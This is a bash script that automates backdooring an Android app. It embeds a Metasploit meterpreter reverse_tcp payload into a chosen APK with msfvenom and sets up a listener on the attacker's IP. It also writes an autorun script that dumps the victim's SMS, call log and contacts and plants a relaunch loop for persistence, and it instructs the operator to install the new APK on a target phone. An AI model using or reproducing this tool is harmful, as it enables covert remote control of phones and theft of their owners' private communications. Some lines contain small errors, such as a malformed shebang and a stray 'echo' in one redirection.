#!/bin/bash/

#Create a working folder
mkdir P0ison_stuff
cd P0ison_stuff/

echo "What is the original apk name (full path please)"
read -e APK
echo
echo
echo "What is the Local IP?"
read LOCAL_IP
echo
echo "What is the Public IP?"
read PUBLIC_IP
echo
echo "What is the listening port?"
read LPORT
echo
echo

#Create listener script
echo "Creating listener script"
sleep 5
echo use exploit/multi/handler >> meterpreter.rc
echo set AutoRunScript autorun.rc >> meterpreter.rc
echo set PAYLOAD android/meterpreter/reverse_tcp >> meterpreter.rc
echo set LHOST $LOCAL_IP >> meterpreter.rc
echo set LPORT $LPORT >> meterpreter.rc
echo exploit -j -z >> meterpreter.rc
echo

#Create metasploit Autorun script
echo "Creating metasploit Autorun script"
sleep 5
echo dump_sms >> autorun.rc
echo dump_calllog >> autorun.rc
echo dump_contacts >> autorun.rc
echo cd / >> autorun.rc
echo cd /sdcard/Download >> autorun.rc
echo upload /root/open.sh >> autorun.rc
echo

#Create persistent backdoor script
echo "Creating persistent backdoor script"
sleep 5
echo #!/bin/bash/  >> open.sh
echo while : >> open.sh
echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> echo open.sh
echo sleep 20 >> open.sh
echo done >> open.sh
echo

#Create embedded apk
echo "Emedding original apk"
cd ~/
msfvenom -x $APK -p android/meterpreter/reverse_tcp LHOST=$PUBLIC_IP LPORT=$LPORT -o /root/P0ison_stuff/NewApp.apk
sleep 5
echo
echo "Copy new apk to target phone and install..."
echo 

#run listener script
read -p "Are you ready to open the listner? (y/n)?" choice
case "$choice" in 
  y|Y ) echo "Copying files and runnning listener...";
	cp /root/P0ison_stuff/meterpreter.rc ~/;
	cp /root/P0ison_stuff/autorun.rc ~/;
	cp /root/P0ison_stuff/open.sh ~/;
	rm -r -f /root/P0ison_stuff/
	msfconsole -r meterpreter.rc;;
  n|N ) echo "Waiting 30 seconds then exiting run 'msfconsole -r meterpreter.rc' to start listening";
	sleep 5;
	exit;; 
  * ) echo "invalid";;
esac

